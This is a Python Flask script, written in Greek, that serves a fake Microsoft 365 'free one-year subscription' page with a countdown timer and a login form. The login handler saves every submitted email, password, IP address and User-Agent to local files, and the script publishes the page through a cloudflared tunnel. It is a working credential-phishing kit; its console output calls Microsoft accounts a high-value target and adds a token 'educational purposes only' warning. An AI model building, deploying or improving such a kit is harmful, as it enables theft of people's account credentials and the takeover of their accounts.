import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'microsoft-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Microsoft 365")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['ms_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Microsoft 365 - Δωρεάν Συνδρομή</title>
        <style>
            :root {
                --microsoft-blue: #0078D4;
                --microsoft-green: #107C10;
                --microsoft-gray: #323130;
                --microsoft-light: #F3F2F1;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F3F2F1 0%, #FFFFFF 100%);
                font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, 'SF Pro Text', -apple-system, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #323130;
                -webkit-tap-highlight-color: transparent;
                padding: 16px;
            }
            
            .login-box {
                background: white;
                width: 100%;
                max-width: 440px;
                padding: 32px 24px;
                border-radius: 12px;
                text-align: center;
                box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
                border: 1px solid #E1DFDD;
                margin: 0 auto;
            }
            
            .microsoft-logo {
                width: 120px;
                height: auto;
                margin: 0 auto 20px;
                display: block;
            }
            
            .office-banner {
                background: linear-gradient(90deg, #0078D4 0%, #00BCF2 50%, #0078D4 100%);
                color: white;
                padding: 16px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 600;
                font-size: 18px;
                border: 2px solid #00BCF2;
                line-height: 1.3;
            }
            
            .subscription-badge {
                background: linear-gradient(45deg, #107C10, #0B990B);
                color: white;
                padding: 14px 24px;
                border-radius: 6px;
                margin: 18px auto;
                font-weight: 700;
                font-size: 20px;
                width: fit-content;
                max-width: 100%;
                border: 2px solid white;
                box-shadow: 0 8px 24px rgba(16, 124, 16, 0.2);
                line-height: 1.2;
            }
            
            .giveaway-container {
                background: #F3F2F1;
                border: 2px dashed #0078D4;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 26px;
                margin: 8px 0;
                color: #323130;
                font-weight: 600;
                letter-spacing: -0.3px;
                line-height: 1.2;
            }
            
            .subtitle {
                color: #605E5C;
                font-size: 14px;
                margin-bottom: 24px;
                line-height: 1.4;
            }
            
            .timer {
                background: #FFF0F0;
                border: 2px solid #D13438;
                border-radius: 6px;
                padding: 16px;
                margin: 18px 0;
                font-family: 'Consolas', 'Cascadia Code', monospace;
                font-size: 22px;
                color: #D13438;
                text-align: center;
                font-weight: 600;
                letter-spacing: 1px;
            }
            
            .features-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 22px 0;
            }
            
            .feature-item {
                background: white;
                border: 1px solid #E1DFDD;
                border-radius: 6px;
                padding: 16px;
                text-align: center;
                transition: all 0.3s ease;
            }
            
            .feature-item:hover {
                border-color: #0078D4;
                box-shadow: 0 4px 12px rgba(0, 120, 212, 0.1);
                transform: translateY(-1px);
            }
            
            .feature-icon {
                font-size: 24px;
                margin-bottom: 8px;
                color: #0078D4;
            }
            
            .feature-label {
                font-size: 12px;
                color: #605E5C;
                margin-top: 6px;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #323130;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 8px;
                display: block;
            }
            
            input {
                width: 100%;
                padding: 16px;
                background: #F3F2F1;
                border: 2px solid #E1DFDD;
                border-radius: 4px;
                color: #323130;
                font-size: 16px;
                -webkit-appearance: none;
                appearance: none;
                transition: all 0.3s;
            }
            
            input:focus {
                border-color: #0078D4;
                outline: none;
                background: white;
                box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.1);
            }
            
            input::placeholder {
                color: #A19F9D;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #0078D4, #00BCF2);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 4px;
                font-weight: 600;
                font-size: 16px;
                width: 100%;
                margin: 22px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
                touch-action: manipulation;
            }
            
            .login-btn:active {
                transform: translateY(0);
                opacity: 0.9;
            }
            
            .login-btn:hover {
                opacity: 0.95;
                transform: translateY(-1px);
                box-shadow: 0 8px 20px rgba(0, 120, 212, 0.25);
            }
            
            .benefits-list {
                text-align: left;
                margin: 22px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 14px 0;
                color: #323130;
                font-size: 14px;
                line-height: 1.3;
            }
            
            .benefit-icon {
                color: #107C10;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .microsoft-badge {
                display: inline-flex;
                align-items: center;
                background: #F3F2F1;
                color: #323130;
                padding: 4px 10px;
                border-radius: 4px;
                font-size: 11px;
                font-weight: 600;
                margin-left: 8px;
                border: 1px solid #E1DFDD;
            }
            
            .warning-note {
                color: #D13438;
                font-size: 12px;
                margin-top: 20px;
                border-top: 1px solid #E1DFDD;
                padding-top: 16px;
                text-align: center;
                line-height: 1.4;
            }
            
            .apps-grid {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin: 18px 0;
                flex-wrap: wrap;
            }
            
            .app-icon {
                background: white;
                border: 1px solid #E1DFDD;
                border-radius: 6px;
                padding: 12px;
                font-size: 20px;
                width: 44px;
                height: 44px;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-shrink: 0;
            }
            
            .enterprise-note {
                background: #F3F2F1;
                border-radius: 6px;
                padding: 14px;
                margin: 18px 0;
                font-size: 13px;
                color: #605E5C;
                text-align: left;
                line-height: 1.4;
            }
            
            .security-badge {
                background: linear-gradient(45deg, #107C10, #0B990B);
                color: white;
                padding: 6px 12px;
                border-radius: 4px;
                font-size: 11px;
                font-weight: 600;
                display: inline-block;
                margin: 8px 0;
                line-height: 1;
            }
            
            /* Mobile Optimizations */
            @media (max-width: 480px) {
                body {
                    padding: 12px;
                    min-height: -webkit-fill-available;
                }
                
                .login-box {
                    padding: 24px 20px;
                    border-radius: 10px;
                }
                
                .microsoft-logo {
                    width: 100px;
                    margin-bottom: 16px;
                }
                
                .office-banner {
                    font-size: 16px;
                    padding: 14px;
                    margin: 16px 0;
                }
                
                .subscription-badge {
                    font-size: 18px;
                    padding: 12px 20px;
                }
                
                h1 {
                    font-size: 22px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 14px;
                }
                
                .features-grid {
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }
                
                .feature-item {
                    padding: 14px;
                }
                
                .benefit-item {
                    font-size: 13px;
                    margin: 12px 0;
                }
                
                input {
                    padding: 14px;
                    font-size: 15px;
                }
                
                .login-btn {
                    padding: 16px;
                    font-size: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .features-grid {
                    grid-template-columns: 1fr;
                }
                
                .office-banner {
                    font-size: 15px;
                }
                
                .subscription-badge {
                    font-size: 16px;
                }
            }
            
            /* Prevent zoom on input focus for mobile */
            @media (max-width: 768px) {
                input, select, textarea {
                    font-size: 16px !important;
                }
            }
            
            /* iOS specific fixes */
            @supports (-webkit-touch-callout: none) {
                body {
                    min-height: -webkit-fill-available;
                }
                
                .login-btn {
                    -webkit-tap-highlight-color: transparent;
                }
            }
        </style>
    </head>
    <body>
        <div style="width: 100%; max-width: 440px;">
            <div class="login-box">
                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
                     alt="Microsoft" 
                     class="microsoft-logo"
                     onerror="this.style.display='none'; document.querySelector('.microsoft-fallback').style.display='block';">
                <div class="microsoft-fallback" style="display: none; font-size: 32px; font-weight: 600; color: #323130; margin-bottom: 20px;">Microsoft</div>
                
                <div class="office-banner">
                    🎉 ΔΩΡΕΑΝ ΣΥΝΔΡΟΜΗ MICROSOFT 365 🎉
                </div>
                
                <div class="subscription-badge">
                    1 ΧΡΟΝΟΣ ΔΩΡΕΑΝ ΣΥΝΔΡΟΜΗ
                </div>
                
                <div class="giveaway-container">
                    <h1>Διεκδικήστε το Microsoft 365</h1>
                    <div class="subtitle">
                        Για μαθητές και επαγγελματίες <span class="security-badge">Ασφαλές</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        15:00
                    </div>
                </div>
                
                <div class="apps-grid">
                    <div class="app-icon">📧</div>
                    <div class="app-icon">📄</div>
                    <div class="app-icon">📊</div>
                    <div class="app-icon">📈</div>
                    <div class="app-icon">🗣️</div>
                </div>
                
                <div class="features-grid">
                    <div class="feature-item">
                        <div class="feature-icon">💻</div>
                        <div>Εφαρμογές Office</div>
                        <div class="feature-label">Πλήρης Πρόσβαση</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">☁️</div>
                        <div>OneDrive</div>
                        <div class="feature-label">1TB Αποθηκευτικούς Χώρου</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">📧</div>
                        <div>Outlook</div>
                        <div class="feature-label">Premium Email</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">👥</div>
                        <div>Teams</div>
                        <div class="feature-label">Για Επιχειρήσεις</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Πλήρες Microsoft 365 Σουίτα (1 Έτος Δωρεάν)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        1TB Cloud Αποθήκευση OneDrive
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Premium Outlook Email (50GB)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Microsoft Teams για Επιχειρήσεις
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Υποστήριξη 24/7 Τηλέφωνο & Web
                    </div>
                </div>
                
                <div class="enterprise-note">
                    🛡️ Περιλαμβάνονται προηγμένα χαρακτηριστικά ασφαλείας: Προστασία Δεδομένων, Προηγμένη Προστασία από Απειλές και Κρυπτογραφημένο Email.
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL, ΤΗΛΕΦΩΝΟ, Ή SKYPE</label>
                        <input type="text" name="username" placeholder="Εισάγετε email, τηλέφωνο ή Skype" required autocomplete="username">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ</label>
                        <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required autocomplete="current-password">
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🆓 Διεκδικήστε Δωρεάν Microsoft 365
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ Αυτή η ειδική προσφορά λήγει σε 15 λεπτά. Η συνδρομή θα ενεργοποιηθεί εντός 24 ωρών.
                </div>
            </div>
        </div>
        
        <script>
            // Prevent double-tap zoom on mobile
            let lastTouchEnd = 0;
            document.addEventListener('touchend', function(event) {
                const now = (new Date()).getTime();
                if (now - lastTouchEnd <= 300) {
                    event.preventDefault();
                }
                lastTouchEnd = now;
            }, false);
            
            // Countdown timer
            let timeLeft = 900; // 15 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = '#FFE5E5';
                    countdownElement.style.borderColor = '#D13438';
                    countdownElement.style.animation = 'pulse 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Η προσφορά έληξε!";
                    countdownElement.style.color = '#D13438';
                    countdownElement.style.animation = 'none';
                }
            }
            
            // Add CSS animation for pulse effect
            const style = document.createElement('style');
            style.textContent = `
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.7; }
                    100% { opacity: 1; }
                }
            `;
            document.head.appendChild(style);
            
            updateTimer();
            
            // Better mobile form handling
            document.querySelector('form').addEventListener('submit', function(e) {
                const submitBtn = this.querySelector('.login-btn');
                submitBtn.disabled = true;
                submitBtn.innerHTML = 'Επεξεργασία...';
                submitBtn.style.opacity = '0.7';
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('ms_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Συνεδρία: {session_id}\n")
        file.write(f"Λογαριασμός Microsoft: {username}\n")
        file.write(f"Κωδικός: {password}\n")
        file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Άγνωστο')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Πλατφόρμα: Microsoft 365 Δωρεάν Συνδρομή\n")
        file.write(f"Υποσχέθηκε: 1 Έτος Microsoft 365 + 1TB OneDrive\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Microsoft 365 Ενεργοποίηση</title>
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F3F2F1 0%, #FFFFFF 100%);
                font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 16px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #323130;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: white;
                padding: 32px 24px;
                border-radius: 12px;
                max-width: 500px;
                width: 100%;
                border: 1px solid #E1DFDD;
                box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
                margin: 0 auto;
            }
            
            .microsoft-logo {
                width: 100px;
                height: auto;
                margin: 0 auto 20px;
                display: block;
            }
            
            .processing-container {
                background: #F3F2F1;
                border: 2px solid #0078D4;
                border-radius: 8px;
                padding: 24px;
                margin: 24px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: #E1DFDD;
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #0078D4, #00BCF2, #107C10);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .subscription-activated {
                background: #F3F2F1;
                border: 2px solid #107C10;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #107C10;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 16px 0;
                color: #323130;
                font-size: 14px;
                line-height: 1.3;
            }
            
            .storage-amount {
                font-size: 36px;
                font-weight: 800;
                background: linear-gradient(45deg, #0078D4, #00BCF2);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin: 16px 0;
                line-height: 1.2;
            }
            
            .app-icons {
                display: flex;
                justify-content: center;
                gap: 16px;
                margin: 20px 0;
                flex-wrap: wrap;
            }
            
            .app-item {
                background: white;
                border: 1px solid #E1DFDD;
                border-radius: 6px;
                padding: 16px;
                font-size: 22px;
                width: 50px;
                height: 50px;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-shrink: 0;
            }
            
            .license-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #107C10, #0B990B);
                color: white;
                padding: 8px 16px;
                border-radius: 4px;
                font-size: 13px;
                font-weight: 600;
                margin: 16px 0;
                line-height: 1.2;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            
            /* Mobile Optimizations */
            @media (max-width: 480px) {
                body {
                    padding: 12px;
                    min-height: -webkit-fill-available;
                }
                
                .container {
                    padding: 24px 20px;
                    border-radius: 10px;
                }
                
                .microsoft-logo {
                    width: 80px;
                    margin-bottom: 16px;
                }
                
                .storage-amount {
                    font-size: 32px;
                }
                
                .processing-container {
                    padding: 20px;
                    margin: 20px 0;
                }
                
                .subscription-activated {
                    padding: 16px;
                }
                
                .status-item {
                    font-size: 13px;
                    margin: 14px 0;
                }
                
                .app-icons {
                    gap: 12px;
                }
                
                .app-item {
                    padding: 14px;
                    width: 44px;
                    height: 44px;
                    font-size: 20px;
                }
                
                .license-badge {
                    font-size: 12px;
                    padding: 6px 14px;
                }
            }
            
            @media (max-width: 360px) {
                .storage-amount {
                    font-size: 28px;
                }
                
                .app-icons {
                    gap: 8px;
                }
                
                .app-item {
                    padding: 12px;
                    width: 40px;
                    height: 40px;
                    font-size: 18px;
                }
            }
            
            /* iOS specific */
            @supports (-webkit-touch-callout: none) {
                body {
                    min-height: -webkit-fill-available;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
                 alt="Microsoft" 
                 class="microsoft-logo"
                 onerror="this.style.display='none'; document.querySelector('.microsoft-fallback').style.display='block';">
            <div class="microsoft-fallback" style="display: none; font-size: 32px; font-weight: 600; color: #323130; margin-bottom: 20px;">Microsoft</div>
            
            <div class="storage-amount">
                1TB Αποθήκευση
            </div>
            
            <div class="license-badge">
                📄 Άδεια Microsoft 365 Ενεργοποιήθηκε
            </div>
            
            <h2 style="margin-bottom: 8px; color: #323130; font-size: 22px;">Η Συνδρομή Ενεργοποιήθηκε!</h2>
            <p style="color: #605E5C; margin-bottom: 24px; font-size: 14px;">Τα οφέλη του Microsoft 365 ρυθμίζονται</p>
            
            <div class="processing-container">
                <h3 style="color: #323130; margin-top: 0; font-size: 16px;">Παροχή της Συνδρομής σας</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p style="color: #605E5C; font-size: 13px; margin-bottom: 0;">Ρύθμιση εφαρμογών και αποθήκευσης...</p>
            </div>
            
            <div class="app-icons">
                <div class="app-item">💻</div>
                <div class="app-item">📧</div>
                <div class="app-item">☁️</div>
                <div class="app-item">👥</div>
            </div>
            
            <div class="subscription-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Microsoft 365</strong> - 1 Έτος Συνδρομή
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>1TB OneDrive</strong> - Cloud αποθήκευση ενεργοποιήθηκε
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Εφαρμογές Office</strong> - Πλήρης πρόσβαση
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Outlook Premium</strong> - 50GB ταχυδρομείο
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Microsoft Teams</strong> - Για επιχειρήσεις
                </div>
            </div>
            
            <p style="color: #605E5C; margin-top: 24px; font-size: 13px; line-height: 1.4;">
                Θα ανακατευθυνθείτε στο Λογαριασμό Microsoft...
                <br>
                <small style="color: #A19F9D; font-size: 12px;">Η συνδρομή σας θα είναι διαθέσιμη σε όλες τις συσκευές εντός 24 ωρών</small>
            </p>
        </div>
        
        <script>
            // Animate storage amount
            setTimeout(() => {
                const storageAmount = document.querySelector('.storage-amount');
                storageAmount.style.transform = 'scale(1.05)';
                storageAmount.style.transition = 'transform 0.3s ease';
                setTimeout(() => {
                    storageAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate app icons
            const apps = document.querySelectorAll('.app-item');
            apps.forEach((app, index) => {
                setTimeout(() => {
                    app.style.transform = 'scale(1.1)';
                    app.style.transition = 'transform 0.3s ease';
                    setTimeout(() => {
                        app.style.transform = 'scale(1)';
                    }, 300);
                }, index * 200);
            });
            
            // Add floating animation to logo
            const logo = document.querySelector('.microsoft-logo');
            if (logo) {
                logo.style.animation = 'float 3s ease-in-out infinite';
                logo.style.animationDelay = '1s';
            }
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🔷 Δημόσιος Σύνδεσμος Microsoft 365: {tunnel_url}")
            print(f"💼 Υπόσχεση: 1 Έτος ΔΩΡΕΑΝ Microsoft 365 + 1TB OneDrive")
            print(f"💾 Τα διαπιστευτήρια αποθηκεύτηκαν στο: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικά διαπιστευτήρια λογαριασμού Microsoft!")
            print("⚠️  Οι λογαριασμοί Microsoft παρέχουν πρόσβαση σε: Windows, Office, Azure, Xbox!")
            print("⚠️  ΑΚΡΑΙΟΣ ΚΙΝΔΥΝΟΣ: Επιχειρησιακά και προσωπικά δεδομένα σε κίνδυνο!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5009, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση της σελίδας Δωρεάν Συνδρομής Microsoft 365...")
    print("📱 Θύρα: 5009")
    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/Microsoft365/")
    print("💼 Υπόσχεση: 1 Έτος ΔΩΡΕΑΝ Συνδρομή Microsoft 365")
    print("☁️  Μπόνους: 1TB Αποθήκευση OneDrive")
    print("⚠️  ΥΨΗΛΗΣ ΑΞΙΑΣ ΣΤΟΧΟΣ: Οι λογαριασμοί Microsoft ελέγχουν πολλαπλές υπηρεσίες!")
    print("⏳ Αναμονή για cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5009")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)